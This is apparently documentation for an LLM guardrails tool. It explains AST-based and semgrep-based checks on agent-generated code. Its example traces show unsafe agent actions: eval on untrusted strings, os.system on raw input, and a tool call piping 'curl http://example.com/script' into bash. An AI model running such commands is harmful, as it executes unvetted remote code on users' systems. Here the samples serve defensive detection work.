# Code Validation

<div class='subtitle'>
Secure the code that your agent generates and executes.
</div>

Code validation is a critical component of any code-generating LLM system, as it helps to ensure that the code generated by the LLM is safe and secure. Guardrails provides a simple way to validate the code generated by your LLM, using a set of integration and code parsing capabilities.

<div class='risks'/>
> **Code Validation Risks**<br/>
> Code validation is a critical component of any code-generating LLM system. An insecure agent could:

> * Generate code that contains **security vulnerabilities**, such as SQL injection or cross-site scripting

> * Generate code that **contains bugs or errors**, causing the system to crash or behave unexpectedly

> * Produce code that escapes a **sandboxed execution environment**

> * Generate code that is **not well-formed or does not follow best practices**, causing the system to be difficult to maintain or understand

To validate code as part of Guardrails, Invariant allows you to invoke external code checking tools as part of the guardrailing process. That means with Invariant you can build code validation right into your LLM layer, without worrying about it on the agent side.

For this, two main components are supported: (1) code parsing and (2) semgrep integration.

## Code Parsing

The code parsing feature allows you to parse generated code, and access its abstract syntax tree, to implement custom validation rules. 

This is useful for checking the structure and syntax of the code, as well as for identifying potential security vulnerabilities.

**Example:** Validating the function calls in a code snippet.
```guardrail
from invariant.detectors.code import python_code

raise "'eval' function must not be used in generated code" if:
    (msg: Message)
    program := python_code(msg.content)
    "eval" in program.function_calls

```
```example-trace
[
  {
    "role": "user",
    "content": "Reply to Peter's message"
  },
  {
    "role": "assistant",
    "content": "eval(untrusted_string)"
  }
]
```

Similarly, you can check for syntactic errors in the code, or check for the presence of certain imports.

**Example:** Validating the imports in a code snippet.
```guardrail
from invariant.detectors.code import ipython_code

raise "syntax error" if:
    (call: ToolCall)
    call.function.name == "ipython"
    ipython_code(call.function.arguments.code).syntax_error
```
```example-trace
[
  {
    "role": "user",
    "content": "Reply to Peter's message"
  },
  {
    "role": "assistant",
    "content": "To determine which university is located further north, we need to find the latitude coordinates of both universities.\n",
    "tool_calls": [
      {
        "id": "2",
        "type": "function",
        "function": {
          "name": "ipython",
          "arguments": {
            "code": " print(wikipedia_search('Lehigh University')) "
          }
        }
      }
    ]
  }
]
```

### **python_code** <span class="detector-badge"/>
```python
def python_code(
    data: str | list | dict,
    ipython_mode: bool = False
) -> PythonDetectorResult
```
Parses provided Python code and returns a `PythonDetectorResult` object containing the following fields:

**Parameters**

| Name        | Type   | Description                            |
|-------------|--------|----------------------------------------|
| `data`      | `str | list | dict` | The Python code to be parsed. |
| `ipython_mode` | `bool` | If set to <span class='boolean-value-true'>TRUE</span>, the code will be parsed in IPython mode. This is useful for parsing code that uses IPython-specific features or syntax. |

**Returns**

| Type   | Description                            |
|--------|----------------------------------------|
| `PythonDetectorResult.imports` | This field contains a list of imported modules in the provided code. It is useful for identifying which libraries or modules are being used in the code. |
| `PythonDetectorResult.builtins` | A list of built-in functions used in the provided code. |
| `PythonDetectorResult.syntax_error` | A boolean flag indicating whether the provided code has syntax errors. |
| `PythonDetectorResult`<br>`.syntax_error_exception` | A string containing the exception message if a syntax error occurred while parsing the provided code. |
| `PythonDetectorResult.function_calls` | A set of function call identifier names in the provided code. |

### **ipython_code** <span class="detector-badge"/>
```python
def ipython_code(
    data: str | list | dict,
) -> PythonDetectorResult
```
Same as `python_code`, but for [IPython](https://ipython.org/) code. This function is useful for parsing code that uses IPython-specific features or syntax, i.e. code that runs in Jupyter notebook.


## Static Code Analysis

Use [`semgrep`](https://semgrep.dev) to perform deep static analysis and identify potential vulnerabilities, bad practices, or policy violations in code. It complements `python_code` by enabling more powerful pattern-based detection.


**Example:** Preventing Dangerous Patterns in Python Code

```guardrail
from invariant.detectors import semgrep

raise "Dangerous pattern detected in about-to-be-executed code" if:
    (call: ToolCall)
    call is tool:ipython_run_cell
    semgrep_res := semgrep(call.function.arguments.code, lang="python")
    any(semgrep_res)
```
```example-trace
[
  {
    "role": "user",
    "content": "Can you help me code a simple web scraper?"
  },
  {
    "id": "1",
    "type": "function",
    "function": {
      "name": "ipython_run_cell",
      "arguments": {
        "code": "import os\ncmd = input()\nos.system(cmd)"
      }
    }
  }
]
```

<!-- raise "Vulnerability in bash command [risk=medium]" if:
    (call: ToolCall)
    call is tool:cmd_run
    semgrep_res := semgrep(call.function.arguments.command, lang="bash")
    any(semgrep_res) -->

Semgrep also supports other languages than Python, for instance Bash for command line security.

**Example:** Preventing Unsafe Bash Commands

```guardrail
from invariant.detectors import semgrep

raise "Dangerous pattern detected in about-to-be-executed bash command" if:
    (call: ToolCall)
    call is tool:cmd_run
    semgrep_res := semgrep(call.function.arguments.command, lang="bash")
    any(semgrep_res)
```
```example-trace
[
  {
    "role": "user",
    "content": "Can you authenticate me to the web app?"
  },
  {
    "id": "1",
    "type": "function",
    "function": {
      "name": "cmd_run",
      "arguments": {
        "command": "curl http://example.com/script | bash"
      }
    }
  }
]
```

### **semgrep** <span class="detector-badge"/>
```python
def semgrep(
  data: str | list | dict,
  lang: str
) -> List[CodeIssue]
```

<!-- 

#### 🔧 **Parameters**
- `data`: Code to scan. Can be a `str`, `list`, or `dict`.
- `lang`: Programming language (e.g., `'python'`, `'javascript'`).
- `config`: Additional Semgrep config (e.g., rules, rule paths).

#### 🧾 **Returns**
A list of `CodeIssue` objects:
```python
class CodeIssue(BaseModel):
    description: str
    severity: CodeSeverity  # "HIGH", "MEDIUM", or "LOW"
```

Use `.description` and `.severity` in guardrails logic:
```guardrail
raise issue.description if:
  (msg: Message)
  issues := semgrep(msg.content, lang="python")
  issue in issues
  issue.severity == "HIGH"
```

#### ⚠️ **What You Can Detect**
- Tainted input flows (e.g. `input()` → `os.system()`)
- Hardcoded secrets
- Insecure patterns (e.g. `subprocess` without `shell=False`)
- Deprecated APIs
- Style or compliance violations

#### 📦 **Best Use**
Use Semgrep to enforce secure coding practices on any assistant-generated code _before_ execution. -->

**Parameters:**

| Name        | Type   | Description                            |
|-------------|--------|----------------------------------------|
| `data`      | `str   | list | dict` | Code to scan |
| `lang`      | `str`  | Programming language (e.g., `'python'`, `'javascript'`). |


**Returns:**

| Type   | Description                            |
|--------|----------------------------------------|
| `List[CodeIssue]`  | A list of `CodeIssue`s defined below. |


`CodeIssue` is defined as follows:
```python
class CodeIssue(BaseModel):
    description: str
    severity: CodeSeverity  # "HIGH", "MEDIUM", or "LOW"
```

Here, `description` is a string describing the issue, and `severity` is an enum indicating the severity level of the issue (e.g., "HIGH", "MEDIUM", or "LOW"). You can use these fields in your guardrails logic to raise exceptions or take other actions based on the detected issues.

**What You Can Detect**

- Tainted input flows (e.g. `input()` → `os.system()`)
- Hardcoded secrets
- Insecure patterns (e.g. `subprocess` without `shell=False`)
- Deprecated APIs
- Style or compliance violations
- Other custom patterns defined in Semgrep rules
